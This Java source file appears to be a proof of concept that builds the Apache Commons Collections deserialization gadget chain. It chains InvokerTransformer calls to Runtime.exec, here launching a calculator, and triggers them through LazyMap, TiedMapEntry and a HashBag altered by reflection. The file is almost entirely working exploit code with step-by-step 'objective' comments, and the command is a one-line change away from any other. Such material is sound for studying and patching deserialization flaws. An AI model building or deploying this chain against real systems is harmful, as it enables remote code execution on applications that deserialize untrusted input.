import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.bag.HashBag;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mockito.internal.util.reflection.Whitebox;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class Concept0x {
    public static void main(String[] args) {
        try {
            // run a command using Transformer
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",
                            new Class[]{String.class, Class[].class},
                            new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec",
                            new Class[]{String.class},
                            new String[]{"/usr/bin/gnome-calculator"}),
            };

            Transformer chainedTransformer = new ChainedTransformer(transformers);


            // objective 2: use chainedTransformer to trigger the command execution
            Map hashMap = new HashMap();
            Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);  // chainedTransformer.transform() will be called
            lazyMap.get("any_key");  // this trigger the cmd execution
            System.exit(0);

            // objective 3: while creating a object we need to invoke lazyMap.get("any_key")
            // Create a TiedMapEntry with the underlying map as our `lazyMap` and key ‘foo’
            TiedMapEntry tidemapentry = new TiedMapEntry(lazyMap, "any_key");
            HashBag h = new HashBag();
            h.add(tidemapentry);
            System.exit(0);

            HashBag hashBag = new HashBag();
            // Set HashBag’s underlying HashMap’s entry table’s first entry’s KEY to be our TiedMapEntry
            hashBag.add(new Object());
            Map internalMap = (Map) Whitebox.getInternalState(hashBag, "map");
            Object[] nodesArray = (Object[]) Whitebox.getInternalState(internalMap, "table");
            Object node = Arrays.stream(nodesArray)
                    .filter(Objects::nonNull)
                    .findFirst()
                    .orElseThrow(() -> new RuntimeException("this can't happen"));

            Whitebox.setInternalState(node, "key", tidemapentry);

            System.out.println(hashBag);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
